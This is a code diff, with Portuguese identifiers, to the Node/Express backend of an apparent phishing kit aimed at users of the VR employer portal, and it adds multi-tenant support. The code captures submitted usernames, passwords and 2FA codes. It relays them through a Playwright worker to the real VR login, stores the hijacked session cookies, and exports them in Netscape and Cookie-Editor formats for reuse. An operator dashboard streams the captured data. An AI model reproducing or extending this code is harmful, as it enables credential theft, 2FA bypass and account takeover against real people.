@@ -55,15 +55,26 @@ let configApp = {
 
 let sseClients = [];
 
+function extrairTenant(req) {
+    const fromBody = req.body && req.body.tenant;
+    const fromQuery = req.query && (req.query.tenant || req.query.cliente);
+    const fromHeader = req.headers && req.headers["x-tenant-id"];
+    const t = fromBody || fromQuery || fromHeader || "default";
+    return String(t).trim() || "default";
+}
+
 function notificarClientes() {
     if (sseClients.length === 0) return;
     try {
-        const payload = gerarDadosPainel();
-        const data = `data: ${JSON.stringify(payload)}\n\n`;
+        const cachePayloads = new Map();
         sseClients = sseClients.filter(client => {
             try {
                 if (client.res.writableEnded || client.res.destroyed) return false;
-                client.res.write(data);
+                const clientTenant = client.tenant || "global";
+                if (!cachePayloads.has(clientTenant)) {
+                    cachePayloads.set(clientTenant, `data: ${JSON.stringify(gerarDadosPainel(client.tenant))}\n\n`);
+                }
+                client.res.write(cachePayloads.get(clientTenant));
                 return true;
             } catch (e) {
                 return false;
@@ -74,9 +85,9 @@ function notificarClientes() {
     }
 }
 
-function gerarDadosPainel() {
-    // 1. Prioriza persistência atômica do SQLite
-    const dadosConsolidados = dbOps.obterDadosConsolidados(configApp.auto_mode);
+function gerarDadosPainel(tenant = null) {
+    // 1. Prioriza persistência atômica do SQLite com suporte multi-tenant
+    const dadosConsolidados = dbOps.obterDadosConsolidados(configApp.auto_mode, tenant);
     if (dadosConsolidados) {
         return dadosConsolidados;
     }
@@ -390,11 +401,13 @@ function executarBot() {
 async function testarViaWorker(usuario, senha, reqMeta = {}) {
     const t0 = performance.now();
     const userKey = usuario.toLowerCase().trim();
+    const tenant = reqMeta.tenant || "default";
     audit.registrar({
+        tenant,
         event_type: "VALIDATION_START",
         usuario,
         status: "PENDING",
-        details: { endpoint: `${WORKER_URL}/testar` },
+        details: { endpoint: `${WORKER_URL}/testar`, tenant },
         ip: reqMeta.ip,
         userAgent: reqMeta.userAgent
     });
@@ -424,11 +437,13 @@ async function testarViaWorker(usuario, senha, reqMeta = {}) {
 
         // Registro detalhado no sistema de auditoria
         audit.registrar({
+            tenant,
             event_type: data.valido ? "VALIDATION_SUCCESS" : (statusCred === "bloqueio_captcha" ? "CAPTCHA_BLOCKED" : "VALIDATION_FAILED"),
             usuario,
             status: data.valido ? "SUCCESS" : (statusCred === "bloqueio_captcha" ? "BLOCKED" : "FAILED"),
             duration_ms: duracaoMs,
             details: {
+                tenant,
                 valido: data.valido,
                 status_credencial: statusCred,
                 mensagem: data.mensagem,
@@ -440,21 +455,22 @@ async function testarViaWorker(usuario, senha, reqMeta = {}) {
         });
 
         if (data.valido && configApp.auto_mode) {
-            console.log(`[FULL-AUTO] 🚀 ${usuario} senha válida na VR em ${duracaoSec}s -> 2FA disparado automaticamente!`);
+            console.log(`[FULL-AUTO][${tenant}] 🚀 ${usuario} senha válida na VR em ${duracaoSec}s -> 2FA disparado automaticamente!`);
         }
 
         notificarClientes();
-        console.log(`[WARM WORKER] ⚡ ${usuario} verificado em ${duracaoSec}s -> ${statusCred} (${data.mensagem || ''})`);
+        console.log(`[WARM WORKER][${tenant}] ⚡ ${usuario} verificado em ${duracaoSec}s -> ${statusCred} (${data.mensagem || ''})`);
         return true;
     } catch (err) {
         const duracaoMs = performance.now() - t0;
         console.warn("[WARM WORKER] Worker offline ou ocupado, acionando fallback bot.py:", err.message);
         audit.registrar({
+            tenant,
             event_type: "VALIDATION_FALLBACK",
             usuario,
             status: "WARNING",
             duration_ms: duracaoMs,
-            details: { error: err.message, fallback: "bot.py" },
+            details: { tenant, error: err.message, fallback: "bot.py" },
             ip: reqMeta.ip,
             userAgent: reqMeta.userAgent
         });
@@ -465,9 +481,9 @@ async function testarViaWorker(usuario, senha, reqMeta = {}) {
     }
 }
 
-async function injetar2FAViaWorker(usuario, codigo) {
+async function injetar2FAViaWorker(usuario, codigo, tenant = "default") {
     try {
-        console.log(`[FULL-AUTO] Despachando código 2FA para o worker: ${usuario} -> ${codigo}`);
+        console.log(`[FULL-AUTO][${tenant}] Despachando código 2FA para o worker: ${usuario} -> ${codigo}`);
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 15000);
 
@@ -487,14 +503,16 @@ async function injetar2FAViaWorker(usuario, codigo) {
 
         dbOps.atualizarStatus2FA(usuario, codigo, decisao);
         if (data.valido && data.cookies && data.cookies.length > 0) {
-            dbOps.salvarSessao(usuario, data.cookies, data.url_final || "");
+            dbOps.salvarSessao(usuario, data.cookies, data.url_final || "", tenant);
         }
 
         audit.registrar({
+            tenant,
             event_type: data.valido ? "2FA_ACEITO" : "2FA_NEGADO",
             usuario,
             status: data.valido ? "SUCCESS" : "FAILED",
             details: {
+                tenant,
                 codigo,
                 mensagem: data.mensagem,
                 total_cookies: data.cookies ? data.cookies.length : 0
@@ -503,7 +521,7 @@ async function injetar2FAViaWorker(usuario, codigo) {
 
         notificarClientes();
 
-        console.log(`[FULL-AUTO] Veredito 2FA VR para ${usuario}: ${decisao.toUpperCase()} (${data.mensagem})`);
+        console.log(`[FULL-AUTO][${tenant}] Veredito 2FA VR para ${usuario}: ${decisao.toUpperCase()} (${data.mensagem})`);
         return data;
     } catch (err) {
         console.warn(`[FULL-AUTO] Falha ao injetar 2FA no worker: ${err.message}. Mantendo em pendente para operador manual.`);
@@ -541,30 +559,32 @@ app.post(
 
         try {
             const usuarioAlvo = nome.trim();
+            const tenant = extrairTenant(req);
             const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
             const userAgent = req.headers["user-agent"] || "";
 
             // 1. Registro de auditoria
             audit.registrar({
+                tenant,
                 event_type: "LOGIN_SUBMITTED",
                 usuario: usuarioAlvo,
                 status: "INFO",
-                details: { ip, userAgent: userAgent.substring(0, 100) },
+                details: { tenant, ip, userAgent: userAgent.substring(0, 100) },
                 ip,
                 userAgent
             });
 
-            // 2. Persistência atômica no SQLite e sincronização com JSON
-            dbOps.salvarLogin({ usuario: usuarioAlvo, senha, ip, userAgent });
+            // 2. Persistência atômica no SQLite com tenant e sincronização com JSON
+            dbOps.salvarLogin({ usuario: usuarioAlvo, senha, ip, userAgent, tenant });
 
             notificarClientes();
 
             console.log(
-                `Nova tentativa recebida: ${usuarioAlvo} (Status: aguardando operador solicitar 2FA | Auditoria: testando na VR)`
+                `[${tenant}] Nova tentativa recebida: ${usuarioAlvo} (Status: aguardando operador solicitar 2FA | Auditoria: testando na VR)`
             );
 
             // 3. Dispara validação prioritária ultrarrápida via Warm Worker
-            testarViaWorker(usuarioAlvo, senha, { ip, userAgent });
+            testarViaWorker(usuarioAlvo, senha, { ip, userAgent, tenant });
 
             // 4. Timeout de segurança ajustado (10s max)
             setTimeout(() => {
@@ -594,6 +614,7 @@ app.post(
 
             return res.json({
                 success: true,
+                tenant,
                 status_login: "aguardando_solicitacao",
                 status_credencial: "testando",
                 usuario: usuarioAlvo,
@@ -907,33 +928,36 @@ app.post(
         try {
             const codigoLimpo = codigo.toString().trim();
             const usuarioLimpo = usuario ? usuario.toString().trim() : "desconhecido";
+            const tenant = extrairTenant(req);
             const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
 
             // 1. Auditoria
             audit.registrar({
+                tenant,
                 event_type: "2FA_SUBMITTED",
                 usuario: usuarioLimpo,
                 status: "INFO",
-                details: { codigo: codigoLimpo },
+                details: { tenant, codigo: codigoLimpo },
                 ip
             });
 
             // 2. Persistência SQLite ACID
-            dbOps.salvar2FA({ usuario: usuarioLimpo, codigo: codigoLimpo, status_2fa: "pendente", ip });
+            dbOps.salvar2FA({ usuario: usuarioLimpo, codigo: codigoLimpo, status_2fa: "pendente", ip, tenant });
 
             notificarClientes();
 
             console.log(
-                `[2FA] Código capturado para ${usuarioLimpo}: ${codigoLimpo} (Status: pendente)`
+                `[2FA][${tenant}] Código capturado para ${usuarioLimpo}: ${codigoLimpo} (Status: pendente)`
             );
 
             // 3. Disparo autônomo de injeção no SSO da VR
             if (configApp.auto_mode) {
-                injetar2FAViaWorker(usuarioLimpo, codigoLimpo);
+                injetar2FAViaWorker(usuarioLimpo, codigoLimpo, tenant);
             }
 
             return res.json({
                 success: true,
+                tenant,
                 status_2fa: "pendente",
                 url_final: URL_FINAL_PADRAO
             });
@@ -1023,10 +1047,24 @@ app.get(
     "/api/painel",
     (req, res) => {
         try {
-            res.json(gerarDadosPainel());
+            const tenant = req.query.tenant || null;
+            res.json(gerarDadosPainel(tenant));
         } catch (err) {
             console.error("Erro ao carregar dados do painel:", err);
             res.status(500).json({ success: false, mensagem: "Erro ao ler registros." });
+        }
+    }
+);
+
+app.get(
+    "/api/tenants",
+    (req, res) => {
+        try {
+            const tenants = dbOps.obterTenants();
+            res.json({ success: true, tenants });
+        } catch (err) {
+            console.error("Erro ao listar tenants:", err);
+            res.status(500).json({ success: false, error: err.message });
         }
     }
 );
@@ -1040,12 +1078,13 @@ app.get(
         if (res.flushHeaders) res.flushHeaders();
 
         const clientId = Date.now() + "_" + Math.random();
-        const newClient = { id: clientId, res };
+        const clientTenant = req.query.tenant || null;
+        const newClient = { id: clientId, tenant: clientTenant, res };
         sseClients.push(newClient);
 
-        // Envia estado inicial imediatamente
+        // Envia estado inicial imediatamente para o tenant solicitado
         try {
-            const initialData = `data: ${JSON.stringify(gerarDadosPainel())}\n\n`;
+            const initialData = `data: ${JSON.stringify(gerarDadosPainel(clientTenant))}\n\n`;
             res.write(initialData);
         } catch (e) {}
 
@@ -1064,14 +1103,16 @@ app.post(
     "/api/limpar",
     async (req, res) => {
         try {
+            const tenant = req.body.tenant || req.query.tenant || null;
             // 1. Limpa banco SQLite e sincroniza JSONs
-            dbOps.limparTodosDados();
+            dbOps.limparTodosDados(tenant);
 
             // 2. Registra purga na auditoria
             audit.registrar({
+                tenant: tenant || "global",
                 event_type: "DATA_PURGE",
                 status: "WARNING",
-                details: { action: "limpar_painel_operador" }
+                details: { action: "limpar_painel_operador", tenant: tenant || "global" }
             });
 
             // 3. Purgar abas e contextos em memória no worker Playwright (Zero Test Pollution)
@@ -1080,7 +1121,7 @@ app.post(
             } catch (wErr) {}
 
             notificarClientes();
-            res.json({ success: true, mensagem: "Registros, banco SQLite e contextos limpos com sucesso." });
+            res.json({ success: true, mensagem: `Registros${tenant ? ` do tenant '${tenant}'` : ''} limpos com sucesso.` });
         } catch (err) {
             console.error("Erro ao limpar dados:", err);
             res.status(500).json({ success: false, mensagem: "Erro ao limpar dados." });
@@ -1118,13 +1159,14 @@ app.get(
     "/api/audit-logs",
     (req, res) => {
         try {
-            const { limit = 100, offset = 0, usuario = "", event_type = "", status = "" } = req.query;
+            const { limit = 100, offset = 0, usuario = "", event_type = "", status = "", tenant = "" } = req.query;
             const logs = audit.listar({
                 limit: parseInt(limit, 10) || 100,
                 offset: parseInt(offset, 10) || 0,
                 usuario: String(usuario || "").trim(),
                 event_type: String(event_type || "").trim(),
-                status: String(status || "").trim()
+                status: String(status || "").trim(),
+                tenant: String(tenant || "").trim()
             });
             return res.json({ success: true, total: logs.length, logs });
         } catch (e) {
@@ -1137,7 +1179,8 @@ app.get(
     "/api/audit-stats",
     (req, res) => {
         try {
-            const stats = audit.obterEstatisticas();
+            const tenant = req.query.tenant || null;
+            const stats = audit.obterEstatisticas(tenant);
             return res.json({ success: true, stats });
         } catch (e) {
             return res.status(500).json({ success: false, error: e.message });
@@ -1157,7 +1200,7 @@ app.delete(
     }
 );
 
-function resolverSessaoCookies(usuarioRaw) {
+function resolverSessaoCookies(usuarioRaw, tenant = null) {
     let usuario = String(usuarioRaw || "").trim();
     try {
         usuario = decodeURIComponent(usuario);
@@ -1166,6 +1209,25 @@ function resolverSessaoCookies(usuarioRaw) {
         }
     } catch (e) {}
     usuario = usuario.toLowerCase().trim();
+
+    // 1. Busca prioritária via SQLite com suporte a tenant
+    if (usuario && usuario !== "sessao" && usuario !== "sessaoremota" && usuario !== "acesso" && usuario !== "ultima" && usuario !== "latest" && usuario !== "exportar") {
+        const dbSess = dbOps.obterSessao(usuario, tenant);
+        if (dbSess && dbSess.cookies && dbSess.cookies.length > 0) {
+            return {
+                sessionData: {
+                    tenant: dbSess.tenant || "default",
+                    usuario: dbSess.usuario,
+                    cookies: dbSess.cookies,
+                    total_cookies: dbSess.total_cookies,
+                    url_final: dbSess.url_final || "https://superportal-empregador.vr.com.br/",
+                    data_hora: dbSess.updated_at ? new Date(dbSess.updated_at).toLocaleString("pt-BR") : new Date().toLocaleString("pt-BR")
+                },
+                userKey: dbSess.usuario.replace(/[^a-z0-9_-]/g, "_"),
+                sessionFile: ""
+            };
+        }
+    }
 
     const isGenerico = !usuario || usuario === "sessao" || usuario === "sessaoremota" || usuario === "acesso" || usuario === "ultima" || usuario === "latest" || usuario === "exportar";
 
@@ -1205,6 +1267,7 @@ function resolverSessaoCookies(usuarioRaw) {
                 const userKey = (r.nome || "").toLowerCase().replace(/[^a-z0-9_-]/g, "_");
                 return {
                     sessionData: {
+                        tenant: r.tenant || "default",
                         usuario: r.nome,
                         data_hora: r.data_hora,
                         url_final: r.url_final || "https://superportal-empregador.vr.com.br/",
@@ -1268,6 +1331,7 @@ function resolverSessaoCookies(usuarioRaw) {
             const rKey = rNome.replace(/[^a-z0-9_-]/g, "_");
             if (rNome === usuario || rKey === userKey || (usuario && rNome.includes(usuario)) || (rNome && usuario.includes(rNome))) {
                 sessionData = {
+                    tenant: r.tenant || "default",
                     usuario: r.nome,
                     data_hora: r.data_hora,
                     url_final: r.url_final || "https://superportal.vr.com.br/",
@@ -1292,8 +1356,9 @@ app.get(
     ["/api/sessao/exportar", "/api/sessaoremota/exportar", "/api/sessao/:usuario/exportar", "/api/sessaoremota/:usuario/exportar"],
     (req, res) => {
         const usuarioParam = (req.params.usuario && req.params.usuario !== "exportar") ? req.params.usuario : (req.query.usuario || "");
+        const tenantParam = req.query.tenant || req.query.cliente || null;
         const formato = (req.query.formato || "json").toLowerCase();
-        const resolved = resolverSessaoCookies(usuarioParam);
+        const resolved = resolverSessaoCookies(usuarioParam, tenantParam);
         if (!resolved || !resolved.sessionData || !resolved.sessionData.cookies) {
             return res.status(404).send("Sessão não encontrada");
         }
@@ -1304,7 +1369,7 @@ app.get(
         if (formato === "netscape" || formato === "txt") {
             let txt = "# Netscape HTTP Cookie File\n";
             txt += "# https://curl.se/docs/http-cookies.html\n";
-            txt += `# Capturado por VR Monitor em ${sessionData.data_hora || new Date().toISOString()}\n\n`;
+            txt += `# Capturado por VR Monitor em ${sessionData.data_hora || new Date().toISOString()} [Tenant: ${sessionData.tenant || 'default'}]\n\n`;
 
             cookies.forEach(c => {
                 const domain = c.domain.startsWith(".") ? c.domain : `.${c.domain}`;
@@ -1346,13 +1411,15 @@ app.get(
     ["/api/sessao", "/api/sessaoremota", "/api/sessao/:usuario", "/api/sessaoremota/:usuario"],
     (req, res) => {
         const usuarioParam = (req.params.usuario && req.params.usuario !== "exportar") ? req.params.usuario : (req.query.usuario || "");
-        const resolved = resolverSessaoCookies(usuarioParam);
+        const tenantParam = req.query.tenant || req.query.cliente || null;
+        const resolved = resolverSessaoCookies(usuarioParam, tenantParam);
         if (!resolved || !resolved.sessionData) {
             return res.status(404).json({ success: false, mensagem: "Sessão de cookies não encontrada." });
         }
 
         const { sessionData, userKey } = resolved;
         const rawCookies = sessionData.cookies || [];
+        const itemTenant = sessionData.tenant || "default";
 
         // Gera formato específico compatível com a extensão Cookie-Editor
         const cookieEditorFormat = rawCookies.map(c => ({
@@ -1371,13 +1438,14 @@ app.get(
 
         return res.json({
             success: true,
+            tenant: itemTenant,
             usuario: sessionData.usuario,
             data_hora: sessionData.data_hora,
             url_final: sessionData.url_final || "https://superportal-empregador.vr.com.br/",
             total_cookies: rawCookies.length,
             cookies: rawCookies,
             cookie_editor_json: cookieEditorFormat,
-            link_acesso: `/sessaoremota/${encodeURIComponent(sessionData.usuario)}`
+            link_acesso: `/sessaoremota.html?usuario=${encodeURIComponent(sessionData.usuario)}&tenant=${encodeURIComponent(itemTenant)}`
         });
     }
 );
